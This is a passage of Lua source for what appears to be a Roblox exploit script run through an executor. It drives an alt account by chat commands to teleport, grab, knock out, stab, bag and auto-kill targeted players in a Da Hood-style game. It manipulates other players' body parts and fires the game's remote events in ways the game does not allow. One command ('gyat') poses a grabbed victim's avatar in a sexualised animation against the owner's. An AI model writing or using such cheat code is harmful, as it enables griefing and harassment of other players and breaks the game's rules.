            LowerArm(CFrame.Angles(0,2*math.pi*delta,0)* CFrame.new(0,500,Move)+ getRoot(OWNER).Position )
        end)
    end
    
    Create('Fog!',function()
        if Alt == false then
            Stop()
            noclip = true
            Fog = true
            FOG()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            Fog = true
            FOG()
        end
    end)
    Create('BigFog!',function()
        if Alt == false then
            Stop()
            noclip = true
            BigFog()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            BigFog()
        end
    end)
    
    Create('Circle!',function()
        if Alt == false then
            Stop()
            noclip = true
            Circle()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            Circle()
        end
    end)
    
    Create('defense!',function()
        if Alt == false then
            Stop()
            noclip = true
            defense()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            defense()
        end
    end)
    
    Create('WideFog!',function()
        if Alt == false then
            Stop()
            noclip = true
            WideFog = true
            WideFOG()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            WideFog = true
            WideFOG()
        end
    end)
    
    Create('FlatFog!',function()
        if Alt == false then
            Stop()
            noclip = true
            FlatFog = true
            FlatFOG()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            FlatFog = true
            FlatFOG()
        end
    end)
    
    Create('Upfog!',function()
        if Alt == false then
            Stop()
            noclip = true
            UpFog = true
            UpFOG()
        elseif Alt == true then
            wait(2)
            Stop()
            noclip = true
            UpFog = true
            UpFOG()
        end
    end)
    
    Arg('Altmode!',function()
        local GetPlayer = gplr(Arg)
        if GetPlayer.Name == STAND.Name then
            if ChatCmds == true then
                Chat("Alt mode activated "..CustomName.."!")
            end
            Alt = true
            if Sounds == true then
                play(8655611378,true,true) 
            end
        end
    end)
    
    Arg('Left!',function()
        local GetPlayer = gplr(Arg)
        if GetPlayer.Name == STAND.Name then
            if ChatCmds == true then
                Chat("Position Set To Left "..CustomName.."!")
            end
            Pos = "Left"
            if Sounds == true then
                play(8655611378,true,true) 
            end
        end
    end)
    
    Arg('Right!',function()
        local GetPlayer = gplr(Arg)
        if GetPlayer.Name == STAND.Name then
            if ChatCmds == true then
                Chat("Position Set To Right "..CustomName.."!")
            end
            Pos = "Right"
            if Sounds == true then
                play(8655611378,true,true) 
            end
        end
    end)
    
    Arg('Back!',function()
        local GetPlayer = gplr(Arg)
        if GetPlayer.Name == STAND.Name then
            if ChatCmds == true then
                Chat("Position Set To Back "..CustomName.."!")
            end
            Pos = "Back"
            if Sounds == true then
                play(8655611378,true,true) 
            end
        end
    end)
    
    Create("left!",function()
        if ChatCmds == true then
            Chat("Position Set To Left "..CustomName.."!")
        end
        Pos = "Left"
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("right!",function()
        if ChatCmds == true then
            Chat("Position Set To Right "..CustomName.."!")
        end
        Pos = "Right"
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("back!",function()
        if ChatCmds == true then
            Chat("Position Set To Back "..CustomName.."!")
        end
        Pos = "Back"
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("Under!",function()
        Pos = "Under"
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("Alt!",function()
        Pos = "Alt"
        if Sounds == true then
            play(8655611378,true,true) 
        end
    end)
    
    Create("light!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        Attack = "Light"
    end)
    
    Create("Heavy!",function()
        if Sounds == true then
            play(8655611378,true,true) 
        end
        Attack = "Heavy"
    end)
    
    CreateTargetAbility("Unview!",function()
        if TARGET then
            viewing = false
        end
    end)
    Create('pen',function()
        blocking = false
    end)
    
    CreateTargetAbility("tele!",function()
        if TARGET then    
            Stop()
            blocking = true
            StopHoverAnim = true
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            if _G.GrabLoaded then _G.GrabLoaded:Disconnect()end
            _G.GrabLoaded = game.workspace.Players.DescendantAdded:Connect(function(Ins)
                if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                    repeat task.wait() until Ins.Part0 ~= nil
                    repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                    local AT0, AT1, AP, A0
                    if Ins.Part0:IsDescendantOf(STAND.Character) then
                        Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                        STAND.Character.Animate.Disabled = true
                        for _, Anim in pairs(STAND.Character.Humanoid:GetPlayingAnimationTracks()) do Anim:Stop() end
                        STAND.Character.Animate.Disabled = false
                        AT0, AT1, AP, A0 = Align(Ins.Parent.Head, OWNER.Character.HumanoidRootPart, Vector3.new(2,3,3), Vector3.new(0, 0, 0))
                    end
                    repeat task.wait() until Ins.Parent == nil
                    STAND.Character.Animate.Disabled = true   
                    for _, Anim in pairs(STAND.Character.Humanoid:GetPlayingAnimationTracks()) do Anim:Stop() end
                    STAND.Character.Animate.Disabled = false    
                    AT0:Destroy()
                    AT1:Destroy()
                    AP:Destroy()
                    A0:Destroy()
                end
            end)
        
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.3)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.1)
            for i,v in pairs(TARGET.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-3)
                end
            end
            game.Workspace.Camera.CameraSubject = getHumanoid(OWNER)
            wait(3)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,15,213)
            for i,v in pairs(TARGET.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-3)
                end
            end
            if not STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then
                local bv = Instance.new("BodyVelocity", STAND.Character.Head)
                bv.velocity = Vector3.new(0,0,0)
                bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            end
            getHumanoid(STAND).AutoRotate = false
        end
    end)
    
    CreateTargetAbility("gyat",function()
        if TARGET then    
            Stop()
            blocking = true
            StopHoverAnim = true
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            if _G.GrabLoaded then _G.GrabLoaded:Disconnect()end
            _G.GrabLoaded = game.workspace.Players.DescendantAdded:Connect(function(Ins)
                if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                    repeat task.wait() until Ins.Part0 ~= nil
                    repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                    local AT0, AT1, AP, A0
                    if Ins.Part0:IsDescendantOf(STAND.Character) then
                        Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                        STAND.Character.Animate.Disabled = true
                        for _, Anim in pairs(STAND.Character.Humanoid:GetPlayingAnimationTracks()) do Anim:Stop() end
                        STAND.Character.Animate.Disabled = false
                        AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, OWNER.Character.HumanoidRootPart, Vector3.new(0, 0, 10), Vector3.new(90, 545, 0))
                        spawn(function()
                            while Ins.Parent ~= nil do
                                task.wait()
                                local Sine = tick() * 60
                                AT1.Position = Vector3.new(0, -1.2, -3.3 + 1 * math.sin(Sine / 8))
                            end
                        end)
                    end
                    repeat task.wait() until Ins.Parent == nil
                    STAND.Character.Animate.Disabled = true   
                    for _, Anim in pairs(STAND.Character.Humanoid:GetPlayingAnimationTracks()) do Anim:Stop() end
                    STAND.Character.Animate.Disabled = false    
                    AT0:Destroy()
                    AT1:Destroy()
                    AP:Destroy()
                    A0:Destroy()
                end
            end)    
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.3)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.1)
            game.Workspace.Camera.CameraSubject = getHumanoid(OWNER)
            for i,v in pairs(TARGET.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-3)
                end
            end
            wait(3)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,15,213)
            for i,v in pairs(TARGET.Character:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
                    v.CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-3)
                end
            end
            if not STAND.Character.Head:FindFirstChildWhichIsA("BodyVelocity") then
                local bv = Instance.new("BodyVelocity", STAND.Character.Head)
                bv.velocity = Vector3.new(0,0,0)
                bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            end
            getHumanoid(STAND).AutoRotate = false
        end
    end)
    
    
    CreateTargetAbility("rm!",function()
        if TARGET then
            Stop()
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.2)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.2)
            TARGET.Character.RightUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.RightUpperLeg.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperLeg.Position = Vector3.new(0,-1200,0)
            wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
        end
    end)
    
    CreateTargetAbility("rk!",function()
        if TARGET then
            Stop()
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.2)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.2)
            TARGET.Character.RightUpperLeg.Position = Vector3.new(0,-1200,0)
            wait(.5)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
        end
    end)
    
    CreateTargetAbility("trail!",function()
        if TARGET then
            Stop()
            blocking = false
            Bind = false
            noclip = true
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            repeat rs.Stepped:Wait()
                getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,0,-4.85)
            until KO(STAND).Value == true
            wait(.1)
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
            task.wait()
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
            task.wait()
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
            repeat rs.Stepped:Wait() until KO(STAND).Value == false
        local Neck = Instance.new("Motor6D");
        Neck.Name = "Neck";
        Neck.Parent = game:GetService("Players").LocalPlayer.Character.Head;
        Neck.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        Neck.Part0 = game:GetService("Players").LocalPlayer.Character.UpperTorso;
        Neck.Part1 = game:GetService("Players").LocalPlayer.Character.Head;
    
        local rightwrist = Instance.new("Motor6D");
        rightwrist.Name = "RightWrist";
        rightwrist.Parent = game:GetService("Players").LocalPlayer.Character.RightHand;
        rightwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        rightwrist.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerArm;
        rightwrist.Part1 = game:GetService("Players").LocalPlayer.Character.RightHand;
    
        local leftwrist = Instance.new("Motor6D");
        leftwrist.Name = "LeftWrist";
        leftwrist.Parent = game:GetService("Players").LocalPlayer.Character.LeftHand;
        leftwrist.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        leftwrist.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerArm;
        leftwrist.Part1 = game:GetService("Players").LocalPlayer.Character.LeftHand;
    
        local RightAnkle = Instance.new("Motor6D");
        RightAnkle.Name = "RightAnkle";
        RightAnkle.Parent = game:GetService("Players").LocalPlayer.Character.RightFoot;
        RightAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        RightAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerLeg;
        RightAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.RightFoot;
    
        local LeftAnkle = Instance.new("Motor6D");
        LeftAnkle.Name = "LeftAnkle";
        LeftAnkle.Parent = game:GetService("Players").LocalPlayer.Character.LeftFoot;
        LeftAnkle.C0 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.C1 = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1);
        LeftAnkle.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerLeg;
        LeftAnkle.Part1 = game:GetService("Players").LocalPlayer.Character.LeftFoot;
        
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.2)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.2)
            TARGET.Character.RightUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.RightUpperLeg.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperLeg.Position = Vector3.new(0,-1200,0)
            wait(1.4)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
            wait(1)
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,0,3)
            getHumanoid(STAND).Sit = true
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait(.1)
            getRoot(STAND).Anchored = true
            game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
            wait(3)
            getRoot(STAND).Anchored = false
            getRoot(STAND).CFrame = CFrame.new(-547,173,-0 )
            getHumanoid(STAND).Sit = false
        end
    end)
    
    CreateTargetAbility("rt!",function()
        if TARGET then
            Stop()
            game.ReplicatedStorage.MainEvent:FireServer("LeaveCrew")
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false then
                    game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                    TargetMalee(TARGET)
                end
            until KO(TARGET).Value == true
            noclip = false
            STAND.Character:WaitForChild("Humanoid"):ChangeState(8)
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,500,0)
            repeat wait() until Attacking(STAND).Value == false or follow == true
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,4,0)
            wait(.2)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
            wait(.2)
            TARGET.Character.RightUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperArm.Position = Vector3.new(0,-1200,0)
            TARGET.Character.RightUpperLeg.Position = Vector3.new(0,-1200,0)
            TARGET.Character.LeftUpperLeg.Position = Vector3.new(0,-1200,0)
            wait(1.4)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
            wait(1)
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,0,3)
            getHumanoid(STAND).Sit = true
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait(.1)
            getRoot(STAND).Anchored = true
            game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
            wait(3)
            getRoot(STAND).Anchored = false
            getRoot(STAND).CFrame = CFrame.new(-547,173,-0 )
            getHumanoid(STAND).Sit = false
        end
    end)
    
    CreateTargetAbility("ch!",function()
        if TARGET then
            Stop()
            game.ReplicatedStorage.MainEvent:FireServer("JoinCrew",CrewID) 
            if STAND.Backpack:FindFirstChild("Combat") then STAND.Backpack:FindFirstChild("Combat").Parent = STAND.Character end
            wait()
            if KO(TARGET).Value == false then
                game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,0,3)
            else
                getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,0,3)
                getHumanoid(STAND).Sit = true
                wait(.1)
                getRoot(STAND).Anchored = true
                game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
            end  
            wait(3)
            getRoot(STAND).Anchored = false
            getRoot(STAND).CFrame = CFrame.new(-547,173,-0 )
            getHumanoid(STAND).Sit = false
        end
    end)
    
    CreateTargetAbility("God!",function()
        if TARGET then
            Stop()
            repeat rs.Stepped:Wait()
                STAND.Character:FindFirstChild('Head').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
                getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
                game.Players.LocalPlayer.Character:FindFirstChild('RightHand').CFrame=CFrame.new(0,-99999,0)
                for _,v in ipairs(STAND.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do v:Stop() end
            until KO(TARGET).Value == true
            wait(.2)
            getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,5,0)
            game.Players.LocalPlayer.Character:FindFirstChild('RightHand').CFrame=CFrame.new(0,-99999,0)
            STAND.Character:FindFirstChild('Head').CFrame = getTorso(STAND).CFrame*CFrame.new(0,0,0)
            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",true)
        end
    end)
    CreateTargetAbility("God1!",function()
        if TARGET then
            Stop()
            if STAND.Character:FindFirstChild('RightHand') then
                STAND.Character:FindFirstChild('RightHand').CFrame = CFrame.new(0,-9999,0)
            end
    
            TARGET.Character.BodyEffects["K.O"]:GetPropertyChangedSignal("Value"):Wait()
            if TARGET.Character:FindFirstChild("GRABBING_CONSTRAINT") then else
                wait(0.3)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(TARGET.Character.UpperTorso.Position.X,TARGET.Character.UpperTorso.Position.Y,TARGET.Character.UpperTorso.Position.Z) * CFrame.new(0,1,0)
                task.wait(0.2)
                local args = {
                    [1] = "Grabbing",
                    [2] = true
                }
            
                game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
            end
            wait(1.7)
            if TARGET.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -499, 0)
            end
        end
    end)
    
    CreateTargetAbility("Bring!",function()
        if TARGET then
            Bring(TARGET)
        end
    end)
    
    
    CreateTargetAbility("View!",function()
        if TARGET then
            Viewing = true
        end
    end)
    
    CreateTargetAbility("Knock!",function()
        if TARGET then
            Stop()
            noclip = true
            Knocked = true
        end
    end)
    
    CreateTargetAbility("falls.",function()
        if TARGET then
            Stop()
            noclip = true
            Knocked = true
        end
    end)
    
    CreateTargetAbility("bag!",function()
        if TARGET then
            Stop()
            noclip = true
            getHumanoid(STAND):UnequipTools()
            repeat rs.Stepped:Wait()
                getRoot(STAND).CFrame = game.Workspace.Ignored.Shop["[BrownBag] - $27"].Head.CFrame
            fireclickdetector(game.Workspace.Ignored.Shop["[BrownBag] - $27"].ClickDetector)
            until STAND.Backpack:FindFirstChild("[BrownBag]")
            STAND.Backpack:FindFirstChild("[BrownBag]").Parent = STAND.Character wait(.1)
            STAND.Character["[BrownBag]"]:Activate() wait(.7)
            Bagging = true
            repeat rs.Stepped:Wait()
                if KO(TARGET).Value == false and not TARGET.Character:FindFirstChild("Christmas_Sock") then
                    getRoot(STAND).CFrame = CFrame.new(getRoot(TARGET).Position.X+(getRoot(TARGET).Velocity.X*AutoPredic),getRoot(TARGET).Position.Y+(getRoot(TARGET).Velocity.Y*0),getRoot(TARGET).Position.Z+(getRoot(TARGET).Velocity.Z*AutoPredic))*CFrame.new(0,0,0)
                    STAND.Character["[BrownBag]"]:Activate()
                end
            until TARGET.Character:FindFirstChild("Christmas_Sock") or not STAND.Character:FindFirstChild("[BrownBag]") or Bagging == false
            getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,100,0) wait(1)
            Summon()
        end
    end)
    
    CreateTargetAbility("Stomp!",function()
        if TARGET then
            Stop()
            noclip = true
            StompTarget = true
        end
    end)
    
    CreateTargetAbility("autokill!",function()
        if TARGET then
            Stop()
            noclip = true
            Kills = true
        end
    end)
    
    CreateTargetAbility("Stab!",function()
        if TARGET then
            Stop()
            noclip = true
            Buy('[Knife]','159','[Knife]')
            Stabbing = true
        end
    end)
    
    CreateTargetAbility("Astab!",function()
        if TARGET then
            Stop()
            noclip = true
            Buy('[Knife]','159','[Knife]')
            KnifeKills = true
        end
    end)
    
    CreateTargetAbility("KAnnoy!",function()
        if TARGET then
            Stop()
            noclip = true
            Buy('[Knife]','159','[Knife]')
            KnifeAnnoy = true
        end
    end)
    
    CreateTargetAbility("Annoy!",function()
        if TARGET then
            Stop()
            noclip = true
            Annoy = true
        end
    end)
    
    CreateTargetAbility("Frame!",function()
        if TARGET then
            Stop()
            noclip = true
            Frame = true
        end
    end)
    
    CreateTargetAbility("Smite!",function()
        if TARGET then
            Stop()
            noclip = true
            SMITE = true
        end
    end)
    
    CreateTargetAbility("Arrest!",function()
        if TARGET then
            if STAND.DataFolder:FindFirstChild("Officer").Value == 1 then
                Stop()
                noclip = true
                Arrest = true
            else
                Chat('I am not officer'..CustomName..'.')
            end
        end
    end)
    
    Create("Knife!",function()
        Stop()
        noclip = true
        Buy('[Knife]','159','[Knife]')
        follow = true
    end)
    
    Create("Gun!",function()
        Stop()
        Buy('[LMG]','3978','[LMG]')
        if STAND.Backpack:FindFirstChild("[LMG]") then
            STAND.Backpack:FindFirstChild("[LMG]").Parent = STAND.Character
            if GunMode == 'Sky' then
                GripPos(-7)
            elseif GunMode == 'Under' then
                GripPos(7)
            end
        end
        getHumanoid(STAND):UnequipTools()
        getRoot(STAND).CFrame=game.Workspace.Ignored.Shop['200 [LMG Ammo] - $318'].Head.CFrame*CFrame.new(0,3,0)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector) wait(1)
        fireclickdetector(game.Workspace.Ignored.Shop["200 [LMG Ammo] - $318"].ClickDetector)
        getRoot(STAND).CFrame = getRoot(OWNER).CFrame*CFrame.new(0,2,3)
        wait(.1)
        follow = true
    end)
    
    CreateTargetAbility("Gstomp!",function()
        if TARGET then
            Stop()
            EquipGun('[LMG]')
            blocking = false
            noclip = true
            GunStomp = true
        end
    end)
    
    CreateTargetAbility("Gknock!",function()
        if TARGET then
            Stop()
            EquipGun('[LMG]')
            blocking = false
            noclip = true
            GunKnock = true
        end
    end)
    
    CreateTargetAbility("Gbring!",function()
        if TARGET then
            Stop()
            EquipGun('[LMG]')
            Gbring(TARGET)
        end
    end)
    
    Create("Gkill!",function()
        Stop()
        EquipGun('[LMG]')
        noclip = true
        gunnear = true
    end)
    
    Create("Attack!",function()
        Stop()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        noclip = true
        killnear = true
    end)
    
    Create("Unattack!",function()
        Stop()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        noclip = true
        follow = true
    end)
    
    Create("Stab!",function()
        Stop()
        Buy('[Knife]','159','[Knife]')
        if Sounds == true then
            play(8655611378,true,true) 
        end
        noclip = true
        knifenear = true
    end)
    
    Create("Unstab!",function()
        Stop()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        noclip = true
        follow = true
    end)
    
    Create("Ora!",function()
        Stop()
        if Sounds == true then
            play(8655611378,true,true) 
        end	
        noclip = true
        ORA = true
    end)
    
    rs.Heartbeat:connect(function()
        if Frame == true then
            if game:GetService('Players'):FindFirstChild(TARGET.Name) then
                if follow == true and Pos == "Right" then
                    MoveToTarget(2,2,2.5)
                elseif follow == true and Pos == "Left" then
                    MoveToTarget(-2,2,2.5)
                elseif follow == true and Pos == "Back" then
                    MoveToTarget(.6,2,3)
                elseif follow == true and Pos == "Under" then
                    MoveToTarget(.6,-15,3)
                elseif follow == true and Pos == "Alt" then
                    local RanX = math.random(-1000,1000)
                    local RanZ = math.random(-1000,1000)
                    MoveTo(RanX,-800,RanZ)
                end
            end    
        end
        if Knocked == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('Combat') Hit()
            TargetMalee(TARGET)
        else
            if Knocked == true and KO(TARGET).Value == true then
                if Attacking(STAND).Value == true then
                    getRoot(STAND).CFrame = getRoot(TARGET).CFrame*CFrame.new(0,300,0)
                else
                    Summon()
                end
            end
        end
    
        if Annoy == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            STAND.Character.HumanoidRootPart.CFrame = CFrame.new(TARGET.Character.HumanoidRootPart.Position.X+(TARGET.Character.HumanoidRootPart.Velocity.X*AutoPredic),TARGET.Character.HumanoidRootPart.Position.Y+(TARGET.Character.HumanoidRootPart.Velocity.Y*0),TARGET.Character.HumanoidRootPart.Position.Z+(TARGET.Character.HumanoidRootPart.Velocity.Z*AutoPredic))*CFrame.new(0,0,0)
            if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() STAND.Character:FindFirstChild('Combat'):Deactivate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
        else
            if Annoy == true and KO(TARGET).Value == true then
                getRoot(STAND).CFrame = CFrame.new(getTorso(TARGET).Position)*CFrame.new(0,-4.5,0)*CFrame.Angles(math.pi*0.5,0,0)
                if STAND.Character:FindFirstChild('Combat') then STAND.Character:FindFirstChild('Combat'):Activate() STAND.Character:FindFirstChild('Combat'):Deactivate() else STAND.Backpack:FindFirstChild('Combat').Parent = STAND.Character end
            end
        end
    
        if KnifeAnnoy == true and KO(TARGET).Value == false then
            StopHoverAnim = true
            noclip = true
            Equip('[Knife]') Hit()
